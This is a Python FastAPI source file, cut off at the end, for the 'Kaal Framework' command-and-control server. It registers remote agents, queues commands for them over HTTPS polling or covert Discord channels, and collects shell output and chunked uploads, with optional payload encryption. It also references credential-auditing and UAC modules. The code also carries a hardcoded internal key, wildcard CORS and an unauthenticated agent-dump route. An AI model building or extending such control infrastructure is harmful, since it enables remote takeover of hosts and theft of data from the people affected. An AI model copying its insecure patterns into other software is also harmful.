from fastapi import FastAPI, WebSocket, Request, HTTPException, Form, File, UploadFile, Response, Depends, Header
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Dict, Any, Optional, List
import asyncio
import json
import logging
import threading as _threading
import queue as _queue
from datetime import datetime
import uuid

# Imoprt Core Modules
# Note: Ensure the root directory is in PYTHONPATH or install as package
import sys
import os
import time
from pathlib import Path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.logger import setup_logger
from core.protocol import PROTOCOL_VERSION
from core.state_manager import terminal_state
from core.config import Config
from core.database import db as database
from core.models import TaskStatus, CommandRequest, BulkDeleteRequest
from core.transport_manager import transport_manager
from core.crypto import crypto as payload_crypto
from console.relay_manager import relay_manager
from contextlib import asynccontextmanager

# Setup
log = setup_logger("web_server")
config = Config()
app = FastAPI(title="Kaal Framework API", version="4.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Internal Security
INTERNAL_API_KEY = "KAAL-INTERNAL-SECURE-KEY-2024"

def verify_internal_key(x_internal_key: Optional[str] = Header(None)):
    if INTERNAL_API_KEY and (not x_internal_key or x_internal_key != INTERNAL_API_KEY):
        from fastapi import HTTPException
        raise HTTPException(status_code=403, detail="Forbidden")

# API Key Authentication Middleware
@app.middleware("http")
async def api_key_middleware(request: Request, call_next):
    api_key = config.get("server.api_key", "")
    path = request.url.path
    # Only enforce on /api/ endpoints, skip static/ws/health
    if api_key and path.startswith("/api/") and path != "/api/health":
        auth = request.headers.get("Authorization", "")
        if auth != f"Bearer {api_key}" and auth != api_key:
            # Allow internal agent endpoints without key (they use protocol auth)
            if not path.startswith("/api/v1/"):
                from fastapi.responses import JSONResponse
                return JSONResponse(
                    status_code=401,
                    content={"detail": "Invalid or missing API key"}
                )
    return await call_next(request)

@asynccontextmanager
async def lifespan(app: FastAPI):
    # --- Startup ---
    global app_loop
    app_loop = asyncio.get_running_loop()

    # 1. Database
    database.connect()
    log.info("SQLite database initialized")

    # 2. Ensure SYSTEM agent exists for logging
    try:
        database.conn.execute(
            "INSERT OR IGNORE INTO agents (id, platform, hostname, first_seen, last_seen, status, connection_type) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            ("SYSTEM", "orchestrator", "KAAL-SERVER", datetime.now().isoformat(),
             datetime.now().isoformat(), "active", "internal")
        )
        database.conn.commit()
        log.info("SYSTEM agent created/verified in database")
    except Exception as e:
        log.error(f"Failed to create SYSTEM agent: {e}")

    # 3. Rehydrate Agents
    for row in database.get_all_agents():
        row_dict = dict(row)
        aid = row_dict["id"]
        if aid not in agents:
            agents[aid] = {
                "id": aid,
                "platform": row_dict["platform"],
                "hostname": row_dict["hostname"],
                "username": row_dict.get("username", "unknown"),
                "internal_ip": row_dict.get("internal_ip", "0.0.0.0"),
                "first_seen": row_dict["first_seen"],
                "last_seen": row_dict["last_seen"],
                "status": row_dict["status"],
                "connection_type": row_dict["connection_type"],
                "transport_type": row_dict.get("transport_type", "discord"),
                "transport_id": row_dict.get("transport_id"),
                "tasks": []
            }
            agent_seq_in[aid] = row_dict.get("seq_in", -1)
            agent_seq_out[aid] = row_dict.get("seq_out", 0)
    log.info(f"Rehydrated {len(agents)} agents from database")

    # 4. Transports & Crypto
    discord_cfg = config.get("proxy.discord", {})
    if isinstance(discord_cfg, dict):
        bot_token = discord_cfg.get("bot_token")
        guild_id = discord_cfg.get("guild_id")
        if bot_token and guild_id:
            transport_manager.configure(bot_token, guild_id, discord_cfg.get("channel_id", ""))
            await transport_manager.ensure_category("kaal-agents")
            log.info("Transport manager configured")

    enc_key = config.get("server.encryption_key", "")
    if enc_key:
        from core.crypto import PayloadCrypto
        import core.crypto
        core.crypto.crypto = PayloadCrypto(enc_key)
        globals()['payload_crypto'] = core.crypto.crypto
        log.info("Payload encryption enabled")

    # 5. Background Workers
    asyncio.create_task(check_agent_status())
    asyncio.create_task(system_integrity_worker())
    
    yield
    # --- Shutdown ---
    database.close()

app = FastAPI(title="Kaal Framework API", version="4.0.0", lifespan=lifespan)



async def log_agent_event(agent_id: str, event_type: str, message: str, severity: str = "INFO"):
    """
    Centralized event logger for agents.
    Logs to: 
    1. Console (via global log)
    2. Database (agent_events table)
    3. Per-Agent text file (logs/agents/<agent_id>.log)
    """
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    
    # 1. Console
    log_line = f"[{severity}] {agent_id} - {event_type}: {message}"
    if severity == "ERROR": log.error(log_line)
    elif severity == "WARNING": log.warning(log_line)
    elif severity == "DEBUG": log.debug(log_line)
    else: log.info(log_line)
    
    # 2. Database
    try:
        database.log_event(agent_id, event_type, message, severity)
    except Exception as e:
        log.error(f"Failed to log event to DB for {agent_id}: {e}")
        
    # 3. File Logging
    try:
        os.makedirs("logs/agents", exist_ok=True)
        log_file = f"logs/agents/{agent_id}.log"
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{severity}] {event_type}: {message}\n")
    except Exception as e:
        log.error(f"Failed to log event to file: {e}")

# In-memory storage for agents (simplified for test)
# Key: agent_id, Value: Agent Data
agents: Dict[str, Dict[str, Any]] = {}

# Sequence number tracking for Universal Protocol V4
agent_seq_in: Dict[str, int] = {}   # agent_id -> last_seq_received
agent_seq_out: Dict[str, int] = {}  # agent_id -> last_seq_sent
agent_task_in: Dict[str, str] = {}  # agent_id -> last_task_id_accepted (for dup detection)
control_messages: List[Dict[str, Any]] = [] # Global C2 state broadcast list

class CommandRequest(BaseModel):
    agent_id: str
    command: str
    parameters: Optional[Dict[str, Any]] = None

@app.get("/api/health")
async def health_check():
    return {"status": "ok", "version": "4.0.0"}

# --- Agent Interaction Endpoints (for Agents) ---

@app.get("/api/v1/control", dependencies=[Depends(verify_internal_key)])
async def get_control_messages():
    """
    Endpoint for C2 Profiles (like Discord) to poll for global state broadcasts.
    When a Web UI connects/disconnects, it pushes state changes here.
    """
    msgs = control_messages.copy()
    control_messages.clear()
    return {"messages": msgs}

@app.post("/api/v1/register", dependencies=[Depends(verify_internal_key)])
async def register_agent(request: Request):
    """
    Endpoint for agents to register themselves.
    Expected JSON: {"agent_id": "...", "platform": "...", "hostname": "...", ...}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        if not agent_id:
            raise HTTPException(status_code=400, detail="Missing agent_id")
        
        agents[agent_id] = {
            "id": agent_id,
            "platform": data.get("platform", "unknown"),
            "hostname": data.get("hostname", "unknown"),
            "username": data.get("username", "unknown"),
            "internal_ip": request.client.host,
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "status": "active",
            "connection_type": "direct",  # direct vs proxy
            "transport_type": data.get("transport_type", "discord"),
            "transport_id": data.get("transport_id"),
            "tasks": []
        }
        # Persist to DB
        database.upsert_agent(agents[agent_id])
        log.info(f"Agent registered: {agent_id} ({data.get('hostname')})")
        
        # Broadcast to UI
        await terminal_state.broadcast("agent_registered", agents[agent_id])
        
        return {"status": "registered"}
    except Exception as e:
        log.error(f"Registration error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/task/{agent_id}", dependencies=[Depends(verify_internal_key)])
async def get_task(agent_id: str):
    """
    Endpoint for agents to poll for tasks via GET (used by HTTPS transport).
    Returns a structured Universal Protocol V4 task JSON or empty body.
    """
    if agent_id not in agents:
        # Agent might not be in-memory after server restart, but in DB
        db_agent = database.get_agent(agent_id)
        if db_agent:
            agents[agent_id] = dict(db_agent)
            agents[agent_id]["tasks"] = []
        else:
            return Response(status_code=204) # No content if unknown

    agent = agents[agent_id]
    agent["last_seen"] = datetime.now().isoformat()
    agent["status"] = "active"
    
    # Throttle DB writes — only persist heartbeat every 10 seconds
    import time as _time
    now_ts = _time.time()
    last_hb = agent.get("_last_db_heartbeat", 0)
    if now_ts - last_hb >= 10:
        database.update_agent_heartbeat(agent_id)
        agent["_last_db_heartbeat"] = now_ts

    if agent["tasks"]:
        task_payload = agent["tasks"].pop(0)

        # Re-use logic from handle_agent_message/queue_command
        if isinstance(task_payload, dict):
            tid = task_payload.get("task_id", "unknown")
            cmd_str = task_payload.get("command", "")
        else:
            tid = str(uuid.uuid4())[:8]
            cmd_str = str(task_payload)

        agent_seq_out[agent_id] = agent_seq_out.get(agent_id, 0) + 1
        
        task_payload_out = {
            "task_id": tid, 
            "command": cmd_str
        }
        
        # Auto-encrypt outgoing payload if enabled
        if payload_crypto.enabled:
            try:
                task_payload_out = payload_crypto.encrypt_payload(agent_id, task_payload_out)
            except Exception: pass

        task_msg = {
            "version": PROTOCOL_VERSION,
            "type": "command",
            "agent_id": agent_id,
            "timestamp": datetime.now().isoformat(),
            "seq": agent_seq_out[agent_id],
            "flags": {"ack_required": True},
            "payload": task_payload_out
        }
        
        log.info(f"Polled task {tid} for agent {agent_id}")
        await log_agent_event(agent_id, "Tasking", f"Sent task {tid} via GET poll")
        try:
            database.update_task_status(tid, TaskStatus.SENT)
        except Exception: pass
        
        return task_msg

    return Response(status_code=204) # Standard for "No Content"

@app.get("/api/v1/dump_agents")
async def dump_agents():
    """Debug route to inspect memory structure of agents dictionary."""
    return agents

@app.post("/api/v1/result", dependencies=[Depends(verify_internal_key)])
async def report_result(request: Request):
    """
    Endpoint for agents to report task results.
    Expected JSON: {"agent_id": "...", "task_id": "...", "result": "..."}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        result = data.get("result")
        
        if agent_id in agents:
            agents[agent_id]["last_seen"] = datetime.now().isoformat()
            log.info(f"Result from {agent_id}: {result[:50]}...")
            
            # Broadcast to UI
            await terminal_state.broadcast("task_result", {
                "agent_id": agent_id,
                "result": result
            })
            
        return {"status": "received"}
    except Exception as e:
        log.error(f"Result error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/agent_message", dependencies=[Depends(verify_internal_key)])
async def handle_agent_message(request: Request):
    """
    Unified endpoint for C2 Profiles (Mythic-style).
    Handles Register, Heartbeat, Result, and Task Fetching in one go.
    """
    try:
        data = await request.json()
        
        # Auto-decrypt encrypted payload if present
        if payload_crypto.enabled and isinstance(data.get("payload"), dict) and payload_crypto.is_encrypted(data["payload"]):
            try:
                agent_id_for_decrypt = data.get("agent_id", "")
                data["payload"] = payload_crypto.decrypt_payload(agent_id_for_decrypt, data["payload"])
                log.debug(f"Decrypted payload from {agent_id_for_decrypt}")
            except Exception as dec_err:
                log.warning(f"Payload decryption failed: {dec_err} — processing as-is")
        
        # Validate protocol version
        if data.get("version") != PROTOCOL_VERSION:
            log.warning(f"Unsupported protocol version {data.get('version')} from agent {data.get('agent_id')}")
            
        msg_type = data.get("type")
        agent_id = data.get("agent_id")
        seq = data.get("seq", 0)
        flags = data.get("flags", {})
        ack_required = flags.get("ack_required", False)
        
        if not agent_id:
            raise HTTPException(status_code=400, detail="Missing agent_id")

        response = {"status": "success", "tasks": []}

        # Sequence number handling
        if agent_id not in agent_seq_in:
            agent_seq_in[agent_id] = -1

        if "seq" in data:
            last_seq  = agent_seq_in.get(agent_id, -1)
            # Extract task_id for smart duplicate detection
            payload   = data.get("payload", {})
            task_id   = payload.get("task_id", "") if isinstance(payload, dict) else ""
            last_task = agent_task_in.get(agent_id, "")

            if msg_type == "register":
                # Always accept register and reset counter
                agent_seq_in[agent_id] = seq - 1

            elif seq < last_seq and last_seq > 1:
                # Sequence went backwards AND we had a real previous session.
                # This means the agent process was restarted — reset and accept.
                log.info(f"[*] Agent {agent_id} reconnect detected (seq {seq} < last {last_seq}). Resetting seq counter.")
                agent_seq_in[agent_id] = seq - 1

            if seq <= agent_seq_in[agent_id] and seq != 0:
                # Same seq AND same task_id
                if task_id and task_id == last_task:
                    await log_agent_event(agent_id, "Protocol", f"Dropped duplicate Sequence {seq} (Match: {task_id})", "DEBUG")
                    if ack_required:
                        agent_seq_out[agent_id] = agent_seq_out.get(agent_id, 0) + 1
                        response["tasks"].append({
                            "version": PROTOCOL_VERSION,
                            "type": "ack",
                            "agent_id": agent_id,
                            "timestamp": datetime.now().isoformat(),
                            "seq": agent_seq_out[agent_id],
                            "flags": {"ack_required": False},
                            "payload": {"ack_seq": seq}
                        })
                    return response
                else:
                    await log_agent_event(agent_id, "Protocol", f"Sequence reuse detected (seq={seq}) with new task. Resetting counter.", "WARNING")
                    agent_seq_in[agent_id] = seq - 1

            agent_seq_in[agent_id] = seq
            if task_id:
                agent_task_in[agent_id] = task_id
            
            # Persist sequences
            database.update_agent_sequences(agent_id, agent_seq_in[agent_id], agent_seq_out.get(agent_id, 0))

        # 0. Auto-Register if unknown (Robustness)
        if agent_id not in agents:
             # Identify transport type from metadata or context
             transport_type = data.get("transport_type") or data.get("transport") or "discord"
             agents[agent_id] = {
                "id": agent_id,
                "platform": data.get("platform", "unknown"),
                "hostname": data.get("hostname", "unknown"),
                "username": data.get("username", "unknown"),
                "internal_ip": request.client.host,
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active",
                "connection_type": "c2_profile",
                "transport_type": transport_type,
                "transport_id": data.get("transport_id"),
                "tasks": []
            }
             database.upsert_agent(agents[agent_id])
             await log_agent_event(agent_id, "Discovery", f"Agent discovered via {transport_type} (Auto-Register)")
             await terminal_state.broadcast("agent_registered", agents[agent_id])

        # Handle Diagnostic Logs from Agent
        if msg_type == "log":
            severity = data.get("severity", "INFO")
            message = data.get("message", "No message")
            await log_agent_event(agent_id, "Diagnostic", message, severity)
            return response

        # 1. Handle Registration
        if msg_type == "register":
             agents[agent_id]["platform"] = data.get("platform", "unknown")
             agents[agent_id]["hostname"] = data.get("hostname", "unknown")
             agents[agent_id]["username"] = data.get("username", agents[agent_id].get("username", "unknown"))
             
             # Refresh transport type
             new_transport = data.get("transport_type") or data.get("transport")
             if new_transport:
                 agents[agent_id]["transport_type"] = new_transport
             
             database.upsert_agent(agents[agent_id])
             await log_agent_event(agent_id, "Handshake", f"Agent registered via {agents[agent_id]['transport_type']}. Platform: {agents[agent_id]['platform']}")
             await terminal_state.broadcast("agent_registered", agents[agent_id])

             # Per-agent Discord channel creation
             per_agent = config.get("proxy.discord.per_agent_channels", False)
             provided_tid = data.get("transport_id")

             if per_agent and transport_manager.guild_id:
                 # Primary: Use ID provided by the profile if it already created one
                 if provided_tid and provided_tid.isdigit():
                     agents[agent_id]["transport_id"] = provided_tid
                     database.set_agent_transport_id(agent_id, provided_tid)
                     await log_agent_event(agent_id, "Discord", f"Adopting profile-assigned channel {provided_tid}")
                 else:
                     # Secondary: Create it ourselves
                     channel_id = await transport_manager.create_agent_channel(
                         agent_id, agents[agent_id].get("platform", "unknown")
                     )
                     if channel_id:
                         agents[agent_id]["transport_id"] = channel_id
                         database.set_agent_transport_id(agent_id, channel_id)
                         await log_agent_event(agent_id, "Discord", f"Assigned private channel {channel_id}")
                     
             # Send explicit registration acknowledgment to the agent
             # Tell the agent to adopt its new transport_id (channel_id)
             agent_seq_out[agent_id] = agent_seq_out.get(agent_id, 0) + 1
             reg_ack_payload = {
                 "status": "success",
                 "transport_id": agents[agent_id].get("transport_id", "")
             }
             if payload_crypto.enabled:
                 try:
                     reg_ack_payload = payload_crypto.encrypt_payload(agent_id, reg_ack_payload)
                 except Exception: pass
                 
             reg_ack = {
                 "version": PROTOCOL_VERSION,
                 "type": "registered",
                 "agent_id": agent_id,
                 "timestamp": datetime.now().isoformat(),
                 "seq": agent_seq_out[agent_id],
                 "flags": {"ack_required": False},
                 "payload": reg_ack_payload
             }

             if agents[agent_id].get("transport_type") == "https":
                 # Polling agents (HTTPS) need this queued so they can GET it
                 agents[agent_id]["tasks"].append(reg_ack)
                 log.info(f"Queued registration ACK for polling agent {agent_id}")
             else:
                 # Push agents (Discord) get it in the direct response
                 response["tasks"].append(reg_ack)
            
            
        # 2. Handle Heartbeat / Checkin
        elif msg_type == "heartbeat":
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                agents[agent_id]["status"] = "active"
                database.update_agent_heartbeat(agent_id)
                
        # 3. Handle Result
        elif msg_type == "result":
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                result_text = data.get("result", "")
                
                try:
                    if isinstance(result_text, str):
                        result_text = json.loads(result_text)
                except json.JSONDecodeError:
                    pass
                
                task_id = data.get("task_id", "unknown")
                log_preview = str(result_text)[:50] if result_text else ""
                log.info(f"Result from {agent_id} (Task {task_id}): {log_preview}...")
                
                # Persist result + update task status
                try:
                    database.update_task_status(
                        task_id, TaskStatus.COMPLETED,
                        result=json.dumps(result_text) if not isinstance(result_text, str) else result_text
                    )
                    database.save_result(agent_id, "result", result_text, task_id)
                except Exception:
                    pass  # task may not exist in DB (legacy)
                
                await terminal_state.broadcast("task_result", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "result": result_text
                })

        # 4. Handle Status / Ack
        elif msg_type == "ack":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                task_id = data.get("task_id", "unknown")
                log.info(f"ACK from {agent_id} for task {task_id}")
                try:
                    database.update_task_status(task_id, TaskStatus.ACKED)
                except Exception:
                    pass
                await terminal_state.broadcast("task_status", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "status": "acknowledged",
                    "message": "Agent received task"
                })

        elif msg_type == "status":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                task_id = data.get("task_id", "unknown")
                status = data.get("status", "processing")
                message = data.get("message", "")
                log.info(f"STATUS from {agent_id} (Task {task_id}): {status} - {message}")
                await terminal_state.broadcast("task_status", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "status": status,
                    "message": message
                })

        # 5. Handle Chunked Upload (Phase 6)
        elif msg_type == "chunk":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                
                stream_id = data.get("stream_id")
                index = data.get("index")
                total = data.get("total")
                task_id = data.get("task_id", "unknown")
                chunk_data = data.get("data", "")
                
                if not stream_id or index is None or total is None:
                    return {"status": "error", "error": "Invalid chunk metadata"}

                # Init buffer
                if "partial_uploads" not in agents[agent_id]:
                    agents[agent_id]["partial_uploads"] = {}
                
                if stream_id not in agents[agent_id]["partial_uploads"]:
                    agents[agent_id]["partial_uploads"][stream_id] = {}
                
                # Store chunk
                agents[agent_id]["partial_uploads"][stream_id][index] = chunk_data
                received_count = len(agents[agent_id]["partial_uploads"][stream_id])
                
                log.info(f"Received chunk {index+1}/{total} from {agent_id} (Stream {stream_id})")
                
                # Check for completion
                if received_count >= total:
                    log.info(f"Reassembling stream {stream_id}...")
                    try:
                        # Sort and join
                        chunks = [agents[agent_id]["partial_uploads"][stream_id][i] for i in range(total)]
                        full_payload = "".join(chunks)
                        
                        # Process as new result message
                        try:
                            # Standardize to dict if it's a JSON string
                            if isinstance(full_payload, str):
                                full_payload = json.loads(full_payload)
                        except json.JSONDecodeError:
                            pass
                            
                        # Extract inner result if the C agent chunked the entire envelope
                        if isinstance(full_payload, dict) and "version" in full_payload and "result" in full_payload:
                            full_payload = full_payload["result"]
                            # Re-parse if it was double stringified
                            try:
                                if isinstance(full_payload, str):
                                    full_payload = json.loads(full_payload)
                            except json.JSONDecodeError:
                                pass
                        
                        await terminal_state.broadcast("task_result", {
                            "agent_id": agent_id,
                            "task_id": task_id,
                            "result": full_payload
                        })
                        
                        del agents[agent_id]["partial_uploads"][stream_id]
                        log.info(f"Stream {stream_id} reassembled and broadcast.")
                    except Exception as e:
                        log.error(f"Reassembly error: {e}")

        # 6. Handle Interactive Shell Output (Phase 8)
        elif msg_type == "shell_output":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                output = data.get("data", "")
                log.info(f"Shell output from {agent_id}: {len(output)} bytes")
                
                await terminal_state.broadcast("shell_output", {
                    "agent_id": agent_id,
                    "output": output,
                    "timestamp": datetime.now().isoformat()
                })

        # 7. Handle Agent Logs (Phase 9)
        elif msg_type == "log":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                level = data.get("level", "INFO")
                message = data.get("message", "")
                timestamp = data.get("timestamp", time.time())
                
                log_entry = {
                    "level": level,
                    "message": message,
                    "timestamp": datetime.fromtimestamp(timestamp).isoformat()
                }
                
                if "logs" not in agents[agent_id]:
                    agents[agent_id]["logs"] = []
                
                # Keep last 100 logs
                agents[agent_id]["logs"].append(log_entry)
                if len(agents[agent_id]["logs"]) > 100:
                    agents[agent_id]["logs"].pop(0)
                    
                log.info(f"Agent {agent_id} LOG [{level}]: {message[:100]}")
                
                await terminal_state.broadcast("agent_log", {
                    "agent_id": agent_id,
                    "log": log_entry
                })

        # 5. Connect Pending Tasks (for all message types)
        # CRITICAL: For polling transports (HTTPS), we do NOT pop tasks here.
        # They will be fetched via GET /api/v1/task/{agent_id}.
        is_polling = agents[agent_id].get("transport_type") == "https"
        
        if agent_id in agents and agents[agent_id]["tasks"] and not is_polling:
            # Get one task (FIFO)
            task_payload = agents[agent_id]["tasks"].pop(0)
            
            # Use stored Task ID if available (dict), else generate new one (str legacy)
            if isinstance(task_payload, dict):
                tid = task_payload.get("task_id", "unknown")
                cmd_str = task_payload.get("command", "")
            else:
                import uuid
                tid = str(uuid.uuid4())[:8]
                cmd_str = str(task_payload)
            
            agent_seq_out[agent_id] = agent_seq_out.get(agent_id, 0) + 1
            task_payload_out = {
                "task_id": tid, 
                "command": cmd_str
            }
            # Auto-encrypt outgoing payload if enabled
            if payload_crypto.enabled:
                try:
                    task_payload_out = payload_crypto.encrypt_payload(agent_id, task_payload_out)
                except Exception as enc_err:
                    log.warning(f"Payload encryption failed: {enc_err} — sending plaintext")
            
            response["tasks"].append({
                "version": PROTOCOL_VERSION,
                "type": "command", 
                "agent_id": agent_id,
                "timestamp": datetime.now().isoformat(),
                "seq": agent_seq_out[agent_id],
                "flags": {"ack_required": True},
                "payload": task_payload_out
            })
            await log_agent_event(agent_id, "Tasking", f"Sent task {tid} ({cmd_str[:20]}...) [Seq: {agent_seq_out[agent_id]}]")
            try:
                database.update_task_status(tid, TaskStatus.SENT)
            except Exception:
                pass

        # Automatically Ack if requested
        if ack_required:
            agent_seq_out[agent_id] = agent_seq_out.get(agent_id, 0) + 1
            response["tasks"].append({
                "version": PROTOCOL_VERSION,
                "type": "ack",
                "agent_id": agent_id,
                "timestamp": datetime.now().isoformat(),
                "seq": agent_seq_out[agent_id],
                "flags": {"ack_required": False},
                "payload": {"ack_seq": seq}
            })

        return response

    except Exception as e:
        log.error(f"Agent Message Error: {e}")
        # Return valid JSON even on error so Profile doesn't crash
        return {"status": "error", "error": str(e)}

@app.get("/api/v1/c2/tasks", dependencies=[Depends(verify_internal_key)])
async def get_c2_tasks(platform: str = "discord"):
    """
    Endpoint for C2 Profiles to poll for pending tasks for agents using the specified transport.
    """
    pending_tasks = []
    for agent_id, agent in agents.items():
        # Skip agents that don't match the polling transport type (prevents task-stealing)
        if agent.get("transport_type") != platform:
            continue

        if agent.get("tasks"):
            task_payload = agent["tasks"].pop(0)
            
            if isinstance(task_payload, dict):
                tid = task_payload.get("task_id", "unknown")
                cmd_str = task_payload.get("command", "")
            else:
                tid = str(uuid.uuid4())[:8]
                cmd_str = str(task_payload)
            
            agent_seq_out[agent_id] = agent_seq_out.get(agent_id, 0) + 1
            pending_tasks.append({
                "version": PROTOCOL_VERSION,
                "type": "command",
                "agent_id": agent_id,
                "timestamp": datetime.now().isoformat(),
                "seq": agent_seq_out[agent_id],
                "flags": {"ack_required": True},
                "payload": {
                    "task_id": tid,
                    "command": cmd_str
                }
            })
            log.info(f"Pushed task {tid} to C2 poll ({platform}) for agent {agent_id}")
            
    return {"tasks": pending_tasks}

@app.post("/api/agent/{agent_id}/clear_queue")
async def clear_agent_queue(agent_id: str):
    """Clear all pending/queued tasks for a specific agent."""
    if agent_id not in agents:
        return {"status": "error", "message": "Agent not found", "cleared": 0}
    count = len(agents[agent_id].get("tasks", []))
    agents[agent_id]["tasks"] = []
    db_count = database.clear_pending_tasks(agent_id)
    total = max(count, db_count)
    log.info(f"[!] Cleared {total} queued task(s) for agent {agent_id}")
    return {"status": "ok", "cleared": total}

@app.get("/api/tasks/{agent_id}")
async def get_task_history(agent_id: str, limit: int = 50):
    """Get task history for an agent with status tracking."""
    tasks = database.get_agent_tasks(agent_id, limit)
    return {"tasks": tasks, "total": len(tasks)}

# --- Config & Plugin Endpoints (Phase 3) ---

@app.get("/api/config")
async def get_config():
    """Return the current configuration."""
    return config.data

@app.post("/api/config")
async def update_config(request: Request):
    """
    Update configuration.
    Expected JSON: {"key": "value"} or nested dicts to merge.
    """
    try:
        new_config = await request.json()
        # Deep merge or replace? For now, we'll do top-level keys update 
        # or rely on Config.set if key provided, but here we likely want full update
        # Simplified: Update top-level keys
        for k, v in new_config.items():
            config.set(k, v)
        return {"status": "updated", "config": config.data}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

from core.plugin_loader import PluginLoader
plugin_loader = PluginLoader([Path("plugins")])
plugin_loader.discover()

@app.get("/api/plugins")
async def list_plugins():
    """Return list of loaded plugins."""
    result = []
    for p_type, p_dict in plugin_loader.plugins.items():
        for p_id, plugin in p_dict.items():
            result.append({
                "id": plugin.id,
                "name": plugin.name,
                "version": plugin.version,
                "type": plugin.type,
                "description": getattr(plugin, "description", "No description")
            })
    return result

@app.post("/api/plugins/reload")
async def reload_plugins():
    """Reload all plugins from disk."""
    plugin_loader.discover()
    return {"status": "reloaded", "count": sum(len(d) for d in plugin_loader.plugins.values())}

# --- AI Copilot Endpoint (Phase 4.0) ---

class CopilotRequest(BaseModel):
    message: str

@app.post("/api/copilot")
async def copilot_chat(req: CopilotRequest):
    """
    Handle AI chat requests.
    Currently a mock response. In production, connect to LLM.
    """
    # Simulate processing time
    await asyncio.sleep(1.5) 
    
    # Simple keyword-based responses for demo
    msg = req.message.lower()
    response = "I am KAAL Copilot. I can assist with system administration and security auditing."
    
    if "hello" in msg or "hi" in msg:
        response = "Hello, Administrator. How can I assist you today?"
    elif "status" in msg:
        active = len([a for a in agents.values() if a['status'] == 'active'])
        response = f"System Status: Operational. {active} agents online."
    elif "scan" in msg or "audit" in msg:
        response = "I can initiate scans. Use the 'Credential Auditor' or 'UAC' modules in the dashboard."
    elif "help" in msg:
        response = "Available commands: status, scan, list agents, relay check."
        
    return {"response": response}

# --- UI Endpoints (for Frontend) ---

@app.get("/api/agents")
async def list_agents():
    return list(agents.values())

@app.delete("/api/agents/{agent_id}")
async def delete_single_agent(agent_id: str):
    """Delete a single agent and its history."""
    if agent_id in agents:
        del agents[agent_id]
    if agent_id in agent_seq_in:
        del agent_seq_in[agent_id]
    if agent_id in agent_seq_out:
        del agent_seq_out[agent_id]
    
    database.delete_agent(agent_id)
    log.info(f"[!] Deleted agent {agent_id}")
    await terminal_state.broadcast("agents_deleted", {"agent_ids": [agent_id]})
    return {"status": "success"}

@app.post("/api/agents/bulk_delete")
async def bulk_delete_agents(request: BulkDeleteRequest):
    """Delete multiple agents and their history."""
    for agent_id in request.agent_ids:
        if agent_id in agents:
            del agents[agent_id]
        if agent_id in agent_seq_in:
            del agent_seq_in[agent_id]
        if agent_id in agent_seq_out:
            del agent_seq_out[agent_id]
        database.delete_agent(agent_id)
    
    log.info(f"[!] Bulk deleted {len(request.agent_ids)} agents")
    await terminal_state.broadcast("agents_deleted", {"agent_ids": request.agent_ids})
    return {"status": "success", "count": len(request.agent_ids)}

@app.post("/api/command")
async def queue_command(cmd: CommandRequest):
    """
    Queue a command for an agent (works for both direct and proxy agents).
    """
    if cmd.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    agent = agents[cmd.agent_id]
    connection_type = agent.get("connection_type", "direct")
    
    # Format task
    task = cmd.command
    if cmd.parameters:
        # Append parameters if needed (simplified)
        pass
    
    if connection_type == "proxy":
        # Route through relay manager
        task_id = relay_manager.send_command(cmd.agent_id, task)
        if not task_id:
            raise HTTPException(status_code=500, detail="Failed to send command through relay")
        log.info(f"Sent command to proxy agent {cmd.agent_id}: {task}")
        
        await terminal_state.broadcast("task_created", {
            "agent_id": cmd.agent_id,
            "task_id": task_id,
            "command": task,
            "status": "pending",
            "timestamp": datetime.now().isoformat()
        })
        return {"status": "sent", "task_id": task_id, "via": "relay"}
    else:
        # Direct agent - queue locally
        import uuid
        task_id = str(uuid.uuid4())[:8]
        # In simple queue, we just store command string. 
        # But we should use dicts to track IDs properly. 
        # For backward compat with existing `handle_agent_message` pop logic, we keep string 
        # BUT we MUST transition `handle_agent_message` to support dicts or encode ID.
        # Let's keep storing string but broadcast the ID we generated.
        # The agent expects a string command OR a dict. 
        # Current agent implementation accepts string.
        # Current server implementation for `handle_agent_message` wraps it in dict with NEW ID.
        # This mismatch means the ID we broadcast here is NOT the ID sent to agent!!!!
        # FIX: We need to store structured task in agents[id]["tasks"] = [{"id":..., "cmd":...}]
        # But `handle_agent_message` lines 199-219 pop string.
        # Let's store string as `ID:CMD` and have handle_agent_message parse it? 
        # No, better to change agents structure to list of dicts.
        
        # ACTUALLY, line 206 inside handle_agent_message generates a NEW ID.
        # This is bad. We can't track it if ID changes.
        # We must change `handle_agent_message` logic. 
        
        # For now, let's just broadcast "pending" and hope for best? No.
        # Let's start storing dicts in tasks list: {"task_id": tid, "command": task}
        agents[cmd.agent_id]["tasks"].append({"task_id": task_id, "command": task})
        database.create_task(cmd.agent_id, task, cmd.parameters, task_id)
        
        log.info(f"Queued task {task_id} for direct agent {cmd.agent_id}: {task}")
        await terminal_state.broadcast("task_created", {
            "agent_id": cmd.agent_id,
            "task_id": task_id,
            "command": task,
            "status": "pending",
